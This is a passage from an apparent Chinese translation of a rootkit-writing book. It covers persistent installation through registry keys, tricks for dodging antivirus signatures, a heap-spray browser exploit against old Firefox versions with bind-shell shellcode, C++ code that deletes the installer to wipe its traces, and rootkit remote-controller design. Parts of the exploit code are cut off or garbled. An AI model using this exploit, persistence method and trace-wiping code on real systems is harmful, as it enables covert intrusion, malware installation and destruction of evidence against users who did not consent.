printf( "MyDeviceDriver was not loaded!\n");
}
利用注册表来启动
有很多方法可以使软件能在 windows 系统引导过程中得到加载并运行。但是公认的用
来加载设备驱动和执行程序的标准几种方法只有少数的几种。本节会为这几种方法都提供一
个示例。
要像设备驱动那样安装一个持久性的 rootkit 可以在注册表添加下面的项：
HKEY_LOCAL_ MACHINE\System\CurrentControlSet\Services:
项 － MyDeviceDriver [随便一个名字都行]
值 － DisplayName [字符串型，应该和项名相匹配]
值 － ErrorControl [DWORD 型的 : 1]
值 － Group [可选的，字符串型 : fileter]
值 － ImagePath [字符串型 ：%windir%\system32\drivers\comint32.sys]
值 － Start[DWORD 型：2]
值 － Type[DWORD 型：1]
Start 的值可以是下面的这些：
SERVICE_BOOT_START = 0
ERVICE_SYSTEM_START = 1
SERVICE_AUTO_START = 2 （这是过滤驱动常用的加载方式）
SERVICE_DEMAND_START = 3 （这是我们之前使用的方式）
SERVICE_DISABLED = 4
Type 的值可以是下面的这些：
SERVICE_KERNEL_DRIVER = 0x00000001
SERVICE_FILE_SYSTEM_DRIVER = 0x00000002
SERVICE_ADAPTER = 0x00000004
SERVICE_RECOGNIZER_DRIVER = 0x00000008
SERVICE_DRIVER
=
(SERVICE_KERNEL_DRIVER
|
SERVICE_FILE_SYSTEM_DRIVER
SERVICE_RECOGNIZER_DRIVER)
SERVICE_WIN32_OWN_PROCESS = 0x00000010
SERVICE_WIN32_SHARE_PROCESS = 0x00000020
SERVICE_WIN32 = (SERVICE_WIN32_OWN_PROCESS
SERVICE_WIN32_SHARE_PROCESS)
SERVICE_INTERACTIVE_PROCESS = 0x00000100
SERVICE_TYPE_ALL = (SERVICE_WIN32 | SERVICE_ADAPTER | SERVICE_DRIVER
| \
SERVICE_INTERACTIVE_PROCESS)
要使用一个应用程序来安装一个 rootkit，需要添加下面的注册表项
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run:  
值 － MyDeviceLoader [字符串型：C:\SCMLoader.exe]
初始化文件
Ghost 使用的初始化文件仅仅包含了远程控制者的 IP 和监听端口。但像 Hacker Defender
那样，初始化文件也可以是非常复杂的。这些文件可以说既是有益也是有具有毁灭性的。一
个可以自定义的初始化接口的好处是不言而喻的，但应该解决它对其它安装的破坏问题。防
病毒软件使用的原则是对文件和传输数据进行特征码的匹配，一个成功的 rootkit 在主流的
反病毒特征码数据库里一天可能不仅只有一个而是有许多的特征码。为了防止这种情况，你
可能希望像 Hacker Defender 那样在 rookti 里添加一些可以忽略掉的通配符。此外，你可能
还会希望使用一些模糊算法来对这些内容进行加密。然而，最简单的方法就是在初始化文件
里加入一些在文件和数据传输里必须会出现的数据来干扰反病毒软件，这样就能够保证在病
毒库里不会出现一个特定的特征码。
举个例子，数字 010,0018,000,001 和 80 必须要通过所有的过滤软件传输出去。如果反
病毒软件阻止这些数字传输就会影响到很多网络传输，因为这些数字出现的机率大太了。然
而组合 “010.018.000.001:00080”出现的机率就大大地减小了，但还是比较普通，所以还是不
能把这块数据做为特征码，但是像 “Controller address: 010.018.000.001, Controller port:
00080” 这样就不同了。
在使用可配置文件时，安装后文件内容出错或者被擦除也是一个重要的问题，本书中的
用来防止这种情况的方法是在使用初始化文件进行初始化后立即把它删除掉。
通过访问你的网站来安装 rootkit
rootkit
rootkit
rootkit
这也许是使用得最广泛的安装技术了。下面这个网页允许在任何一台计算机上使用 Mozilla
Firefox 1.4 或者之前更早的版本来进行远程连接：
Exploit for Mozilla Firefox version 1.04 (or Earlier)
function OnLoadBody()
{
location.href="javascript:void (new InstallVersion());";
CrashAndBurn();
};
// This functions loads the stack with a payload and then buffer overflows
function CrashAndBurn()
{
// Spray up to this address
var heapSprayToAddress=0x12000000;
// Payload - Bind port 28876 to take complete control of the caller
var ShellcodeBytes =
"90 90 90 90 eb 43 56 57 8b 45 3c 8b 54 05 78 01 ea 52 8b 52 20 01 " +
"ea 31 c0 31 c9 41 8b 34 8a 01 ee 31 ff c1 cf 13 ac 01 c7 85 c0 75 " +
"f6 39 df 75 ea 5a 8b 5a 24 01 eb 66 8b 0c 4b 8b 5a 1c 01 eb 8b 04 " +
"8b 01 e8 5f 5e ff e0 fc 31 c0 64 8b 40 30 8b 40 0c 8b 70 1c ad 8b " +
"68 08 31 c0 66 b8 6c 6c 50 68 33 32 2e 64 68 77 73 32 5f 54 bb 71 " +
"a7 e8 fe e8 90 ff ff ff 89 ef 89 c5 81 c4 70 fe ff ff 54 31 c0 fe " +
"c4 40 50 bb 22 7d ab 7d e8 75 ff ff ff 31 c0 50 50 50 50 40 50 40 " +
"50 bb a6 55 34 79 e8 61 ff ff ff 89 c6 31 c0 50 50 35 02 01 70 cc " +
"fe cc 50 89 e0 50 6a 10 50 56 bb 81 b4 2c be e8 42 ff ff ff 31 c0 " +
"50 56 bb d3 fa 58 9b e8 34 ff ff ff 58 60 6a 10 54 50 56 bb 47 f3 " +
"56 c6 e8 23 ff ff ff 89 c6 31 db 53 68 2e 63 6d 64 89 e1 41 31 db " +
"56 56 56 53 53 31 c0 fe c4 40 50 53 53 53 53 53 53 53 53 53 53 6a " +
"44 89 e0 53 53 53 53 54 50 53 53 53 43 53 4b 53 53 51 53 87 fd bb " +
"21 d0 05 d0 e8 df fe ff ff 5b 31 c0 48 50 53 bb 43 cb 8d 5f e8 cf " +
"fe ff ff 56 87 ef bb 12 6b 6d d0 e8 c2 fe ff ff 83 c4 5c 61 eb 89 ";
// Use regular expressions to set unescape sequence
var payLoadCode = unescape( ShellcodeBytes.replace( /\s*([0-9A-Fa-f][0-9A-Fa-
f])\s*([0-9A-Fa-f][0-9A-Fa-f])/g, "%u$2$1" ) );
// Size of the heap blocks
var heapBlockSize = 0x400000;
// Size of the payload in bytes
var payLoadSize = payLoadCode.length * 2;
// Caluclate spray slides size
var spraySlideSize = heapBlockSize - (payLoadSize + 0x38); // exclude header
// Set first spray slide ("pdata") with "pvtbl" address - 0x11C0002C
var spraySlide1 = unescape("%u002C%u11C0");
spraySlide1 = getSpraySlide(spraySlide1,spraySlideSize);
var spraySlide2 = unescape("%u002C%u1200"); //0x1200002C
spraySlide2 = getSpraySlide(spraySlide2,spraySlideSize);
var spraySlide3 = unescape("%u9090%u9090");
spraySlide3 = getSpraySlide( spraySlide3, spraySlideSize );
// Spray the heap
heapBlocks=(heapSprayToAddress-0x400000)/heapBlockSize;
memory = new Array();
for ( i = 0; i > 1));
}
function getSpraySlide( spraySlide, spraySlideSize )
{
while ( spraySlide.length * 2 
这个漏洞在整个 2005 年都是可以利用的。在同一时期，Internet Explorer5 有一个类似的 GDI
漏洞也可以达到相同的目的。实际上可以用一个 rootkit 安装例程来代替上面的 payload 部分。
这是上面讲到的漏洞描述链接：
www.mozilla.org/projects/security/known-vulnerabilities.html (reference MFSA 2005-50)
www.microsoft.com/technet/security/bulletin/MS04-028.mspx
清理安装痕迹
windows 操作系统并没有提供一种可以让进程删除自身的机制。这是因为在进程运行的时自
身映像是受到保护的。幸运的是，在使用批处理文件时并没有这样的限制。所以一个程序通
过动态地创建一个批处理文件可以擦除所有的安装痕迹。这个批处理文件即可以删除创建它
的程序也可以把自己给删除掉。
下面的例子可添加到任何一个自已编写的安装程序里：
#include 
#include 
#include 
#include 
#include 
#include 
using namespace std;
typedef struct _DIRECTORY_STRUCT {
string path;
bool isdir;
vector subDirectories;
_DIRECTORY_STRUCT(const string& path, bool isdir = false):path(path),
isdir(isdir){}
} DIRECTORY_STRUCT;
// Called by removeDirectory
void fillDirStruct( DIRECTORY_STRUCT& root )
{
WIN32_FIND_DATA data;
memset( &data, 0, sizeof(data) );
HANDLE handle = FindFirstFile( root.path.c_str(), &data );
if(handle != ( HANDLE)NULL )
FindClose( handle );
root.isdir = ((data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0);
if(!root.isdir)
return;
string path = root.path;
path.append("\\*");
handle = FindFirstFile( path.c_str(), &data );
// skip "."
FindNextFile( handle, &data );
// skip ".."
memset( &data, 0, sizeof(data) );
while( FindNextFile( handle, &data ) == TRUE )
{
path = root.path;
path.append( "\\" ).append( data.cFileName );
root.subDirectories.push_back( DIRECTORY_STRUCT( path ) );
memset( &data, 0, sizeof(data) );
};
FindClose(handle);
}
// Called by removeDirectory
void removeFile( const char * filename )
{
if( !filename )
return ;
SetFileAttributes( filename, FILE_ATTRIBUTE_NORMAL );
DeleteFile( filename );
return ;
}
// Recursive function to delete a directory and all subdirectories
void removeDirectory( string& path )
{
if( path.empty() )
return;
DIRECTORY_STRUCT dirStruct( path.c_str() );
fillDirStruct( dirStruct );
if( dirStruct.isdir )
{
for( unsigned int j = 0; j < dirStruct.subDirectories.size(); j ++ )
{
string dpath = dirStruct.subDirectories[j].path;
removeDirectory( dpath );
}
::rmdir( path.c_str() );
}
else
{
removeFile( path.c_str() );
}
return;
}
static const char batchFileName[] = "uninstallRootkit.bat";
void SelfDestruct()
{
// temporary batch file
static char batchFile[] =
":Repeat\r\n"
"del \"%s\"\r\n"
"if exist \"%s\" goto Repeat\r\n"
"rmdir \"%s\"\r\n"
"del \"%s\"";
char modulename[MAX_PATH];
char temppath[MAX_PATH];
char folder[MAX_PATH];
GetTempPath( MAX_PATH, temppath );
strcat( temppath, batchFileName );
GetModuleFileName( NULL, modulename, MAX_PATH );
strcpy ( folder, modulename );
char *pb = strrchr( folder, '\\' );
if (pb != NULL)
*pb = 0;
HANDLE hf;
hf = CreateFile( temppath, GENERIC_WRITE, 0, NULL,
CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL );
if (hf != INVALID_HANDLE_VALUE)
{
DWORD len;
char *bat;
bat = (char*)alloca( strlen( batchFile ) +
strlen( modulename ) * 2 + strlen( temppath ) + 20 );
wsprintf( bat, batchFile, modulename, modulename, folder, temppath );
WriteFile( hf, bat, strlen( bat ), &len, NULL );
CloseHandle( hf );
ShellExecute( NULL, "open", temppath, NULL, NULL, SW_HIDE );
}
}
// Removes %system32%\MyRootkit, then removes itself
int main(int argc, char* argv[])
{
char systemDirectory[ MAX_PATH + 1 ];
if( !GetSystemDirectory( systemDirectory, MAX_PATH + 1 ) )
return 1;
// Delete the install directory
string directoryToDelete;
directoryToDelete = systemDirectory;
directoryToDelete += "\\MyRootkit";
removeDirectory( directoryToDelete );
// Delete this program
SelfDestruct();
return 0;
}
对安装进行测试
用来测试 rookit 安装的最好工具是 anti-rookit 软件。
ProcessGuard
(www.diamondcs.com.au/processguard)
和
AntiHook
(www.infoprocess.com.au/AntiHook.php) 是 对 安 装 进 行 测 试 非 常 棒 的 工 具 。 F-Secure
Blacklight (www.f-secure.com/blacklight) 也是值得推荐的，Blacklight 可以用来测试的不仅是
安装技术，不能测试更多其它的。
记住，即使是最牛 B 的 rookit 到最后还是会被检测出来。此外，聪明的用户总是能够
想方设法来绕过甚至是最顽固的软件。统计法有有利于分析这种问题。如果你的目标是开发
数字版权管理软件来防止自由共享音乐的扩散，过滤 80%的音乐文件传输是一个合理的目
标。最后，你会发现你在保护方面所花费的心思并没有得到意想中的满意效果。
总结
本章除了讲 rootkit 外还讲述了许多类似的传统软件的相关注意事项。如果你曾经设计和开
发过安装软件，你对这里描述的许多细节就不会感到疑惑，但是这里还是讨论了一些对你来
说可能是新知识的 rookit 技术，这些内容如下：
恶意安装
特权的提升
持久性安装
ZwSetSystemInformation
通过利用漏洞来安装
安装清理工作
下章会讲述一个基本的 rootkit 控制器。和安装模块要求尽量和 rootkit 本身分离不同，
在设计一个 rootkit 时候必须要把 rookit 控制器作为 rootkti 完整的一部分来考虑。清楚一个
rootkit 应该如何被控制和期望从 rootkti 得到什么样的回应对 rootkit 的设计和实现都是有非
常大的影响的。
笫十二章 Ghost
Ghost
Ghost
Ghost 跟踪器
概述
本章主要讲述 rootkit 远程控制器的设计与实现。虽然 rootkit 可以按照一些固定的规则
来进行设计，但是一个 rootkti 控制器的设计根据目的的不同而存在有很大的差别，为此在
本章中关于如何实现一个特殊目的的这一部分比提供的例子更为重要。
本章包括以下内容：
控制器
界面介质
界面摘要视图
控制分类
防纂改检测
一个实例
控制器
建立一个 rootkit 控制器首先要决定 rootkit 需要什么样的控制。也许一个 rootkit 不
需要控制器是不可能的，但是如果你确实是不需要一个控制器，那么在没有控制器机制的情
况下将能简化 rootkit 的总体设计并且使得 rootkti 更难以被检测到。如果你的目的是要监视
你有物理访问权的少数计算机，也许文件记录更适合你。如果你的设计需要简单的远程控制，
例如开或者关，或者偶尔的更新等，也许监视指定封包的 HTTP 输入流，然后注入到 HTTP
输出流达到传输 rootkit 状态的目的是最好的。
如果你需要不仅是上面讲的简单的控制，那么就需要和 rootkit 一起设计一个远程控制
器。在 rootkit 的功能变得越来越多的时候这控制器就会显得越来越重要。我们已经见识了
一个从只能隐藏自身到能够演示出现在的 rookit 所使用的技术的一个功能强大的 rootkit 例
子的变化。如果在设计时没有考虑到控制器对 roortkti 重要性，那么在添加别的功能时就会
导致代码的效率低下，需要重新设计，通信频道占用带宽高，接口混乱等等。
如果你正在编写一个需要外部控制的专业 rootkit，那么你就需要一个专业的 rootkit 控
制器。这个控制器通常在前端有一个完善的图形用户接口(GUI)，在后台有一个强大的数据
库。控制器的的集中性和控制链接的占用的低带宽性也是一个重要的考虑因素。另外，和
rootkit 比起来,控制器要考虑的安装问题很可能比 rootkit 还要多。综述这个要考虑的因素，
在 rootkit 的整体设计中很可能需要添加一个新的组件:市场策略。
对于 rootkit，营销人员最多只能在 rootkit 的技术说明书的编写上提供帮助，但是远程
控制器就完全是另一回事了。你要做好准备花大量的时间和不同的专业人员一起解决远程控
制器的设计问题。然而 rootkit 可能会被归类到“低技术含量”的这一类并把它交给开发人
员去实现，而 rootkit 控制是不用任技术基础知识的“界面主导”软件。这使得 rootkit 控制
器的设计变得是由市场主导的。通信链接的效率，数据库模式，进程线程模型和用来开发
rootkti 的程序语言有可能被归类到 “低技术含量”这一类然后留给开发人员，报告界面，
状态界面，外壳界面和方案产生界面可能被归到市场这一类。